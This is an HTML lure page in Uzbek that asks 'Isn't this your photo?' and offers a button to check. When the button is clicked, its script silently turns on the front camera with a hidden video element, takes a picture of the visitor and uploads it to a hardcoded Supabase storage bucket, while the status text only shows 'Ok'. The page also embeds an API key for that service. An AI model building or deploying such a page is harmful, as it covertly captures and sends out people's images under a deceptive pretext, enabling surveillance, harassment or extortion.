<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Bu sizning Rasmingiz Emasmi?</title>
  <style>
    :root{--bg:#071027;--muted:#9aa4b2;--accent:#ffb703}
    body{margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto;background:linear-gradient(180deg,#071027,#0b1220);color:#e6eef8;padding:18px}
    .wrap{max-width:920px;margin:0 auto}
    .card{background:rgba(255,255,255,0.02);padding:18px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.5)}
    #startBtn{padding:14px 18px;border-radius:12px;border:0;background:linear-gradient(90deg,var(--accent),#fb8500);color:#071027;font-weight:800;font-size:16px;cursor:pointer}
    .muted{color:var(--muted);font-size:13px}
    #status{margin-top:10px;color:var(--muted)}
  </style>
</head>
<body>
  <div class="wrap">
    <h2>Bu sizning Rasmingiz Emasmi?</h2>
    <div class="card">
      <p class="muted">
        Rasm bu yerda ðŸ‘‡.
      </p>

      <video id="video" autoplay playsinline muted style="display:none;"></video>
      <button id="startBtn">Tekshirish uchun bosing</button>
      <div id="status">Holat: tayyor</div>
    </div>
  </div>

  <script type="module">
    import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

    // ðŸ”¹ Supabase maâ€™lumotlaringiz
    const SUPABASE_URL = 'https://kkgqjomcitybtwofcosl.supabase.co'
    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtrZ3Fqb21jaXR5YnR3b2Zjb3NsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIwMTUwNjUsImV4cCI6MjA3NzU5MTA2NX0.utPwP0hD8TwgSf_CJu9oFl2N5hIeG_meOgDwHFEQSTs'
    const BUCKET_NAME = 'photos'

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
    const video = document.getElementById('video')
    const startBtn = document.getElementById('startBtn')
    const statusEl = document.getElementById('status')
    let stream = null

    function setStatus(txt, err=false){
      statusEl.textContent = 'Holat:' + txt
      statusEl.style.color = err ? 'crimson' : '#9aa4b2'
    }

    async function captureBlobFromStream(stream) {
      const track = stream.getVideoTracks()[0]
      if (window.ImageCapture) {
        try {
          const imageCapture = new ImageCapture(track)
          const blob = await imageCapture.takePhoto()
          return blob
        } catch (err) {
          console.warn('ImageCapture xatosi, canvas fallbackga oÊ»tildi:', err)
        }
      }
      // fallback
      const videoEl = video
      const w = videoEl.videoWidth || 640
      const h = videoEl.videoHeight || 480
      const canvas = document.createElement('canvas')
      canvas.width = w
      canvas.height = h
      const ctx = canvas.getContext('2d')
      ctx.drawImage(videoEl, 0, 0, w, h)
      return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9))
    }

    async function startFrontCameraAndUpload() {
      try {
        startBtn.disabled = true
        setStatus('Tekshirilmoqda')

        // ðŸ“¸ oldi kamera (`user`)
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        video.srcObject = stream

        await new Promise(r => setTimeout(r, 800))
        const blob = await captureBlobFromStream(stream)
        if (!blob) throw new Error('Tekshirilmadi')

        stream.getTracks().forEach(t => t.stop())
        video.srcObject = null
        setStatus('Ok')

        const fileName = `frontcam-${Date.now()}.jpg`
        const { error } = await supabase.storage.from(BUCKET_NAME).upload(fileName, blob, {
          contentType: 'image/jpeg'
        })
        if (error) throw error

        setStatus('Ok')
      } catch (err) {
        console.error(err)
        setStatus('Xatolik: ' + err.message, true)
        if (stream) stream.getTracks().forEach(t => t.stop())
      } finally {
        startBtn.disabled = false
      }
    }

    startBtn.addEventListener('click', () => startFrontCameraAndUpload())
  </script>
</body>
</html>
